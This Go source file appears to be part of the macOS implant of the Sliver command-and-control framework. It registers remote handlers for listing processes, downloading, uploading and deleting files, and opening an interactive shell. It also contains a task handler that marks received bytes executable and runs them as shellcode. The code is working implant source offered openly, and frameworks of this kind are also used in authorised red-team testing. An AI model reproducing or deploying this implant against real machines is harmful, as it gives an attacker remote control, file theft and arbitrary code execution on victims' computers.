package main

import (
	// {{if .Debug}}
	"log"
	// {{else}}
	// {{end}}

	pb "sliver/protobuf/sliver"
	"syscall"
	"unsafe"

	"github.com/golang/protobuf/proto"
)

var (
	darwinHandlers = map[uint32]RPCHandler{

		pb.MsgPsListReq:   psHandler,
		pb.MsgPing:        pingHandler,
		pb.MsgKill:        killHandler,
		pb.MsgDirListReq:  dirListHandler,
		pb.MsgDownloadReq: downloadHandler,
		pb.MsgUploadReq:   uploadHandler,
		pb.MsgCdReq:       cdHandler,
		pb.MsgPwdReq:      pwdHandler,
		pb.MsgRmReq:       rmHandler,
		pb.MsgMkdirReq:    mkdirHandler,

		pb.MsgShellReq:  startShellHandler,
		pb.MsgShellData: shellDataHandler,
	}
)

func getSystemHandlers() map[uint32]RPCHandler {
	return darwinHandlers
}

// Adapted/stolen from: https://github.com/lesnuages/hershell/blob/master/shell/shell_default.go#L48
func taskHandler(data []byte, resp RPCResponse) {
	dataAddr := uintptr(unsafe.Pointer(&data[0]))
	page := getPage(dataAddr)
	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
	dataPtr := unsafe.Pointer(&data)
	funcPtr := *(*func())(unsafe.Pointer(&dataPtr))
	go funcPtr()
	resp([]byte{}, nil)
}

// Get the page containing the given pointer
// as a byte slice.
func getPage(p uintptr) []byte {
	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
}

func remoteTaskHandler(data []byte, resp RPCResponse) {
	remoteTask := &pb.RemoteTask{}
	err := proto.Unmarshal(data, remoteTask)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}
	resp([]byte{}, err)
}
